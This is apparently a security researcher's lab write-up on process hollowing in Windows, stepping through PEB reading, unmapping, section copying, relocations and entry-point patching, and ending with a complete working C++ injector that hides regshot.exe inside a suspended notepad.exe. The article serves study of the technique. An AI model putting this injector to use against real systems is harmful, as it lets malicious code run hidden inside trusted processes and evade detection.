# Process Hollowing

This lab is my attempt to better understand a well known code injection technique called process hollowing, where a victim process is carved out from memory and gets replaced with a new malicious binary.

Although I was not able to fully achieve process hollowing \(does not work with all binaries\), I feel I got pretty close and still found great value in doing this lab since the aim was to:

* get a better understanding of the technique's technicalities under the hood
* become a bit more comfortable with c++ and Windows APIs
* get a bit more familiar with image relocations
* become a bit more comfortable with inspecting / manipulating program's memory
* get to do more PE parsing

The lab was heavily based on the great resource [https://github.com/m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing).

If you need more info on parsing PE files, see my previous lab:

{% page-ref page="../pe-file-header-parser-in-c++.md" %}

## Execution

{% hint style="warning" %}
You may notice that `ImageBaseAddress` varies across the screenshots.   
This is because I ran the binary multiple times and the ASLR played its role.
{% endhint %}

### Destination / Host Image

Let's start calc.exe as our host process - this is going to be the process that we will be hollowing out and replacing with cmd.exe.

![](../../.gitbook/assets/screenshot-from-2019-04-28-16-28-59%20%281%29.png)

### Destination ImageBaseAddress

Get location of the image base address from the PEB structure. Since we know that the PEB is located at 0100e000:

![](../../.gitbook/assets/screenshot-from-2019-04-28-16-36-33.png)

and we know that the `ImageBaseAddress`is 8 bytes away from the PEB:

![](../../.gitbook/assets/screenshot-from-2019-04-28-16-38-29.png)

We can get the offset location like so:

![](../../.gitbook/assets/screenshot-from-2019-04-28-16-33-33.png)

We can then get the `ImageBaseAddress` by reading that memory location:

![](../../.gitbook/assets/screenshot-from-2019-04-28-16-39-47.png)

Let's confirm we got the right `ImageBaseAddress`:

```text
dt _peb @$peb
```

![](../../.gitbook/assets/screenshot-from-2019-04-28-16-41-15.png)

### Source Image

Let's now switch gears to the source file - the binary that we want to execute inside the host/destination process. In my case, it's a cmd.exe. I've opened the file, allocated required memory space and read the file to that location:

![](../../.gitbook/assets/peek-2019-04-28-16-44.gif)

### Source Image Size

Let's get the `SizeOfImage` of the source image \(cmd.exe\) from its Optional Headers of the PE we just read - we need to know this value since we will need to allocate that much memory in the destination process \(calc\) in order to copy over the souce image \(cmd\):

![](../../.gitbook/assets/screenshot-from-2019-04-28-16-47-39.png)

### Destination Image Unmapping

We can now carve / hollow out the destination process. Note how at the moment, before we perform the hollowing, the memory at address `01390000` \(`ImageBaseAddress`\) contains the calc.exe binary:

![](../../.gitbook/assets/screenshot-from-2019-04-28-16-50-46.png)

Let's proceed with the hollowing:

![](../../.gitbook/assets/screenshot-from-2019-04-28-16-52-13.png)

If we check the `ImageBaseAddress` now, it's gone:

![](../../.gitbook/assets/peek-2019-04-28-16-53.gif)

### Allocating Memory In Destination Image

We now need to allocate a block of memory of size `SizeOfImage` in the destination process that will be our new `ImageBaseAddress` of the source image. Ideally, we would allocate memory at ImageBaseAddress of the destination image, however I was getting an error `ERROR_INVALID_ADDRESS` although I could see the memory at that address was properly unmapped where it was committed previously and contained the destination image:

![Not sure if this is the main reason the lab failed.](../../.gitbook/assets/screenshot-from-2019-04-28-18-40-56.png)

Microsoft on `ERROR_INVALID_ADDRESS`:

> If this address is within an enclave that you have not initialized by calling [InitializeEnclave](https://msdn.microsoft.com/6A711135-A522-40AE-965F-E1AF97D0076A), **VirtualAllocEx** allocates a page of zeros for the enclave at that address. The page must be previously uncommitted, and will not be measured with the EEXTEND instruction of the Intel Software Guard Extensions programming model.
>
> If the address in within an enclave that you initialized, then the allocation operation fails with the **ERROR\_INVALID\_ADDRESS** error.

Although I did ot use enclaves, I am not sure if Windows 10 did that for me as part of some API call I used or when loading the destination process in memory.

Interesting to note that even the main reference resource I used for this lab was failing with the same error at exact location.

For the above reason, we will let the compiler decide where the new memory will be allocated. After memory allocation, we need to calculate the delta between the `ImageBaseAddress` of the destination image and the source image preferred `ImageBase`:

![](../../.gitbook/assets/screenshot-from-2019-04-28-16-59-40.png)

### Copying Source Image Headers

We can now copy over the source image headers into the newly allocated memory:

![](../../.gitbook/assets/peek-2019-04-28-17-16.gif)

### Copying Source Image Section Headers to Destination Process

Let's now get the first Section Header of the source file and make sure we are reading it correctly by comparing the details via a PE parser:

![](../../.gitbook/assets/screenshot-from-2019-04-28-17-08-28.png)

We now need to copy over all the PE sections of the source file to the destination process. This loop will do it for us:

![](../../.gitbook/assets/screenshot-from-2019-04-28-17-12-18.png)

Below shows how a .text section is copied over from the disk to memory:

![](../../.gitbook/assets/peek-2019-04-28-17-12.gif)

We can see the bytes on the disk \(left\) match those in memory \(right\), so we know the section was copied over successfully:

![](../../.gitbook/assets/screenshot-from-2019-04-28-17-14-51.png)

### Relocations

Now it's time to perform relocations. Since our source image will start in a different place compared to where the destination process was loaded into initially, the image needs to be patched in memory. First of we need to find the pointer to `.reloc` section in our source binary:

![](../../.gitbook/assets/screenshot-from-2019-04-28-17-23-57.png)

### Reading Relocation Table

Now, let's get information about the fist relocation block and make sure we are reading it correctly:

![](../../.gitbook/assets/screenshot-from-2019-04-28-17-27-06.png)

### Getting Relocations Count

Since we know the relocation block size and the size of an individual relocation entry, we can work out how many relocations this block defines:

![](../../.gitbook/assets/screenshot-from-2019-04-28-17-30-39.png)

### Relocating

Below loop will do the hard work in patching the required memory locations:

![](../../.gitbook/assets/screenshot-from-2019-04-28-17-44-19.png)

Below shows how the loop iterates through the relocation entries \(cross reference bottom right screen for RVAs\) and patches the memory as seen in the top right corner:

![](../../.gitbook/assets/peek-2019-04-28-17-44.gif)

### Changing AddressOfEntryPoint

We now need to capture the destination process thread context since it conains a pointer to the `eax` register which we will need to update with an updated image AddressOfEntryPoint before resuming the the thread:

![](../../.gitbook/assets/screenshot-from-2019-04-28-17-47-47.png)

Once that is done, we can update the AddressOfEntryPoint of the source image, update the thread with new entry point and resume the thread:

![](../../.gitbook/assets/screenshot-from-2019-04-28-17-48-03.png)

At this point, our cmd.exe should be launched inside the hollowed out calc.exe. Unfortunately, in my lab environment, this did not work and failed with:

![](../../.gitbook/assets/screenshot-from-2019-04-28-17-53-11.png)

I am sure I messed something up along the way. Having said that, I tried compiling and running the POC provided at [https://github.com/m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing) and cross referenced results of my program with the POC - everything matched up, includig the final error :\)

If you are reading this and you see what I have missed, as always, I want to hear from you.

## Update

After talking to [@mumbai](https://twitter.com/ilove2pwn_), the issue I was having with memory allocation in the destination process at the `ImageBaseAddress` is now magically gone. This means that I can now perform process hollowing. I will be using notepad.exe \(line 28\) as the destination process and regshot.exe \(line 42\) will written to the hollowed notepad.exe:

![](../../.gitbook/assets/screenshot-from-2019-04-29-21-15-38.png)

Below is a online that constantly checks if there's a notepad.exe process running \(our destination process\). Once found, we check if a process `*regshot*` \(our source binary\) is running - to prove that it is not, since it should be hidden inside the notepad.exe, and break the loop:

```csharp
while(1) { get-process | ? {$_.name -match 'notepad'} | % { $_; get-process "*regshot*"; break } }
```

Below shows this all in action - once the program is compiled and executed, notepad.exe is launched, powershell loop \(top right\) stops. Note how regshot.exe is not visible in the process list, however when closing regshot.exe process the notepad.exe closes - the hollow is successful:

![](../../.gitbook/assets/peek-2019-04-29-21-27.gif)

## Code

{% code-tabs %}
{% code-tabs-item title="process-hollowing.cpp" %}
```cpp
// process-hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <winternl.h>

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

int main()
{
	// create destination process - this is the process to be hollowed out
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION *pbi = new PROCESS_BASIC_INFORMATION();
	DWORD returnLenght = 0;
	CreateProcessA(NULL, (LPSTR)"c:\\windows\\syswow64\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
	HANDLE destProcess = pi->hProcess;

	// get destination imageBase offset address from the PEB
	NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght);
	DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8; 
	
	// get destination imageBaseAddress
	LPVOID destImageBase = 0;
	SIZE_T bytesRead = NULL;
	ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);

	// read source file - this is the file that will be executed inside the hollowed process
	HANDLE sourceFile = CreateFileA("C:\\temp\\regshot.exe", GENERIC_READ,	NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
	LPDWORD fileBytesRead = 0;
	LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
	ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);
	
	// get source image size
	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
	SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;

	// carve out the destination image
	NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
	myNtUnmapViewOfSection(destProcess, destImageBase);

	// allocate new memory in destination image for the source image
	LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	destImageBase = newDestImageBase;

	// get delta between sourceImageBaseAddress and destinationImageBaseAddress
	DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;

	// set sourceImageBase to destImageBase and copy the source Image headers to the destination image
	sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
	WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

	// get pointer to first source image section
	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
	PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
	int err = GetLastError();

	// copy source image sections to destination
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
		WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
		sourceImageSection++;
	}

	// get address of the relocation table
	IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	
	// patch the binary with relocations
	sourceImageSection = sourceImageSectionOld;
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		BYTE* relocSectionName = (BYTE*)".reloc";
		if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0) 
		{
			sourceImageSection++;
			continue;
		}

		DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
		DWORD relocationOffset = 0;

		while (relocationOffset < relocationTable.Size) {
			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
			relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
			DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);

			for (DWORD y = 0; y < relocationEntryCount; y++)
			{
				relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocationEntries[y].Type == 0)
				{
					continue;
				}

				DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
				DWORD patchedBuffer = 0;
				ReadProcessMemory(destProcess,(LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
				patchedBuffer += deltaImageBase;

				WriteProcessMemory(destProcess,	(PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead);
				int a = GetLastError();
			}
		}
	}

	// get context of the dest process thread
	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pi->hThread, context);

	// update dest image entry point to the new entry point of the source image and resume dest image thread
	DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
	context->Eax = patchedEntryPoint;
	SetThreadContext(pi->hThread, context);
	ResumeThread(pi->hThread);

	return 0;
}

```
{% endcode-tabs-item %}
{% endcode-tabs %}

## References

{% embed url="https://github.com/m0n0ph1/Process-Hollowing" %}

{% page-ref page="../pe-file-header-parser-in-c++.md" %}

